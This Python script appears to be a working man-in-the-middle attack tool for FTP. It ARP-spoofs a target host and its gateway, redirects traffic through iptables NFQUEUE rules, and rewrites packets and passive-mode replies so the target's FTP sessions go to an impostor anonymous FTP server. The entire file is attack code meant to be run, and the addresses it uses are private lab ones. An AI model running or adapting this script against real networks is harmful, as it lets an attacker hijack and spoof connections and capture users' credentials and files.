from netfilterqueue import NetfilterQueue
from scapy.all import IP, TCP, send, ARP, Ether, srp
import threading
import re
import subprocess
from ipaddress import ip_network
import time
from pyftpdlib.authorizers import DummyAuthorizer
from pyftpdlib.handlers import FTPHandler
from pyftpdlib.servers import FTPServer

# Configuration
fake_ftp_ip = "192.168.2.128"
gateway_ip = "192.168.2.1"
ftp_ip = "192.168.1.200"
target_ip = "192.168.2.129"
interface_name = "ens33"

# More configuration, that most likely won't need to be meddled
fake_ftp_serve_directory = "/home/"
fake_ftp_port = 2121
ftp_port = 21
ftp_data_port = {}


def is_same_network(IP1, IP2):
    return (
        ip_network(IP1, strict=False).network_address
        == ip_network(IP2, strict=False).network_address
    )


def get_mac(ip):
    arp_request = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = srp(arp_request_broadcast, timeout=5,
                        verbose=False, iface=interface_name)[0]
    if len(answered_list) > 0:
        return answered_list[0][1].hwsrc

    return None


def start_arpspoof(target, spoof):
    if target == spoof:
        return

    target_mac = get_mac(target)
    if not target_mac:
        return

    while True:
        packet = ARP(op=2, pdst=target, hwdst=target_mac, psrc=spoof)
        send(packet, verbose=False)
        time.sleep(1)


def add_iptable_rules():
    """Add the relevant netfilterqueue rules to iptables"""
    subprocess.check_output(
        [
            "iptables",
            "-t",
            "mangle",
            "-A",
            "PREROUTING",
            "-i",
            interface_name,
            "-j",
            "NFQUEUE",
            "--queue-num",
            "1",
        ]
    )
    subprocess.check_output(
        [
            "iptables",
            "-t",
            "mangle",
            "-A",
            "POSTROUTING",
            "-o",
            interface_name,
            "-j",
            "NFQUEUE",
            "--queue-num",
            "2",
        ]
    )


def flush_iptable_rules():
    subprocess.check_output(["iptables", "--table", "mangle", "--flush"])


def to_intercept_incoming(pkt):
    """Conditions
    1. Destination port = FTP-Data or Real FTP Port
    2. Destination IP = Real FTP IP"""

    # Preliminary filtering
    if IP not in pkt or TCP not in pkt:
        return False

    return pkt[IP].dst == ftp_ip and (
        pkt[TCP].dport == ftp_port or pkt[TCP].dport in ftp_data_port
    )


def incoming(packet):
    """Intercepts all incoming packets"""
    pkt = IP(packet.get_payload())
    print("Raw incoming: ", pkt.summary())

    if not to_intercept_incoming(pkt):
        if IP in pkt and pkt[IP].dst == fake_ftp_ip:
            packet.accept()
            return
        # "Forwards" the packet normally
        send(pkt)
        packet.drop()
        return

    # Guaranteed to have both TCP and IP in layer
    pkt[IP].dst = fake_ftp_ip

    if pkt[TCP].dport == ftp_port:
        pkt[TCP].dport = fake_ftp_port
    elif pkt[TCP].flags.F:
        ftp_data_port[pkt[TCP].dport] = 1

    pkt[IP].len = None
    pkt[IP].chksum = None
    pkt[TCP].chksum = None

    print("Modified: ", pkt.summary())
    packet.set_payload(bytes(pkt))
    packet.accept()


def modify_ftp_packet(pkt):
    """Modifies the ftp packet such that it points to the MiTM"""
    if TCP not in pkt:
        return

    if not pkt[TCP].payload:
        return

    content = pkt[TCP].load.decode().strip()
    # It just works
    regex = r"227 Entering passive mode \([\d]{1,3},[\d]{1,3},[\d]{1,3},[\d]{1,3},([\d]{1,3},[\d]{1,3})\)"
    result = re.match(regex, content)
    if not result:
        return

    ip = ftp_ip.replace(".", ",")
    port = result.group(1)

    calculated_port = list(map(int, port.split(",")))
    calculated_port = calculated_port[0] * 256 + calculated_port[1]
    ftp_data_port[calculated_port] = 0
    print(ftp_data_port)
    content = f"227 Entering passive mode ({ip},{port})"
    pkt[TCP].remove_payload()
    pkt[TCP].add_payload(content)


def to_intercept_outgoing(pkt):
    """Conditions
    1. Source port = FTP-Data or MITM FTP Port
    2. Source IP = MITM FTP IP"""

    # Preliminary filtering
    if IP not in pkt or TCP not in pkt:
        return False

    return pkt[IP].src == fake_ftp_ip and (
        pkt[TCP].sport == fake_ftp_port or pkt[TCP].sport in ftp_data_port
    )


def outgoing(packet):
    """Intercepts all outgoing traffic handler"""
    pkt = IP(packet.get_payload())
    print("Outgoing: ", pkt.summary())

    if not to_intercept_outgoing(pkt):
        packet.accept()
        return

    # Guaranteed to have both TCP and IP in the packet
    pkt[IP].src = ftp_ip

    if pkt[TCP].sport == fake_ftp_port:
        pkt[TCP].sport = ftp_port
        modify_ftp_packet(pkt)
    elif ftp_data_port[pkt[TCP].sport]:
        del ftp_data_port[pkt[TCP].sport]

    print(ftp_data_port)
    pkt[IP].len = None
    pkt[IP].chksum = None
    pkt[TCP].chksum = None

    print("Modified: ", pkt.summary())
    packet.set_payload(bytes(pkt))
    packet.accept()


def main():
    # Start ftp server
    authorizer = DummyAuthorizer()
    authorizer.add_anonymous(fake_ftp_serve_directory)

    handler = FTPHandler
    handler.authorizer = authorizer

    # listen on every IP on my machine on port 21
    address = ("0.0.0.0", fake_ftp_port)
    server = FTPServer(address, handler)
    threading.Thread(target=server.serve_forever).start()

    # Some logic to determine who to spoof
    if is_same_network(f"{target_ip}/24", f"{ftp_ip}/24"):
        pass
        # threading.Thread(target=start_arpspoof,
        #                  args=(target_ip, ftp_ip)).start()
    threading.Thread(target=start_arpspoof, args=(
        gateway_ip, target_ip)).start()
    threading.Thread(target=start_arpspoof, args=(
        target_ip, gateway_ip)).start()

    # iptables for nfqueue
    flush_iptable_rules()
    add_iptable_rules()

    # Netfilter Interception
    nf1 = NetfilterQueue()
    nf1.bind(1, incoming)

    nf2 = NetfilterQueue()
    nf2.bind(2, outgoing)
    try:
        t1 = threading.Thread(target=nf1.run)
        t2 = threading.Thread(target=nf2.run)

        t1.start()
        t2.start()
        t2.join()
    except KeyboardInterrupt:
        print("")

    nf1.unbind()
    nf2.unbind()
    flush_iptable_rules()


if __name__ == "__main__":
    main()
